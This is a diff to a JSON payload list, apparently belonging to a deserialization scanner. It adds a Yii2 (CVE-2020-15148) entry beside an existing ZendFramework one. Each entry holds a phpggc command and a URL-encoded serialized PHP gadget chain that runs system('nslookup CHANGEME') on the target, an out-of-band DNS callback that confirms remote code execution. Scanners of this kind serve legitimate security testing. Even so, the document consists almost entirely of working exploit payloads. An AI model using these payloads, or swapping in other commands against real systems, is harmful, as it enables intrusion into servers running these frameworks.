@@ -199,6 +199,12 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
+    "name": "Yii2 < 2.0.38 (CVE-2020-15148) Alternative",
+    "gen_with": "./phpggc Yii2/RCE2 \"system('nslookup CHANGEME');\"",
+    "payload": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"%00yii\\db\\BatchQueryResult%00_dataReader\"%3BO:17:\"yii\\web\\DbSession\":1:{s:13:\"writeCallback\"%3Ba:2:{i:0%3BO:32:\"yii\\caching\\ExpressionDependency\":1:{s:10:\"expression\"%3Bs:83:\"system('nslookup CHANGEME')%3B\"%3B}i:1%3Bs:18:\"evaluateDependency\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (1)",
     "gen_with": "./phpggc ZendFramework/RCE1 \"system('nslookup CHANGEME');\"",
     "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:83:\"system('nslookup CHANGEME')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
